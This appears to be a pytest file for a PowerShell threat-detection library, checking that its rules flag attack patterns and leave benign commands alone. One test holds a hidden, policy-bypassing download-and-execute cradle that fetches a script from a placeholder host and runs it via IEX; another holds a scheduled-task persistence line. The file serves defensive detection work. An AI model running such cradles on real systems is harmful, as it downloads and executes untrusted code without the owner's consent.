from pathlib import Path
import sys


ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from psdetect.features.extract import build_feature_record
from psdetect.rules.engine import evaluate_attack_patterns


def test_download_cradle_matches_multiple_attack_patterns():
    text = (
        "powershell -ExecutionPolicy Bypass -WindowStyle Hidden "
        "$wc = New-Object Net.WebClient; "
        "IEX ($wc.DownloadString('https://example.invalid/a'))"
    )
    result = evaluate_attack_patterns(text)

    assert "download_primitive" in result.matched_rule_ids
    assert "download_and_execute_chain" in result.matched_rule_ids
    assert "hidden_bypass_execution" in result.matched_rule_ids
    assert result.max_level >= 2
    assert result.risk_score >= 40


def test_feature_record_contains_rule_features():
    record = build_feature_record(
        sample_id="case-1",
        text="Register-ScheduledTask -TaskName x; Invoke-Expression 'calc'",
    )

    assert record.rules.matches
    assert record.numeric_features["rule_match_count"] >= 1
    assert record.numeric_features["rule_scheduled_task_persistence"] == 1.0
    assert record.numeric_features["rule_invoke_expression"] == 1.0


def test_benign_winrm_service_check_does_not_trigger_lateral_movement_rule():
    result = evaluate_attack_patterns("Get-Service -Name 'WinRM' | Select-Object Name, Status, StartType")

    assert "psremoting_lateral_movement" not in result.matched_rule_ids


def test_benign_run_key_read_does_not_trigger_persistence_rule():
    result = evaluate_attack_patterns("Get-ItemProperty -Path 'HKCU:\\Software\\Contoso\\Run' | Select-Object *")

    assert "run_key_persistence" not in result.matched_rule_ids
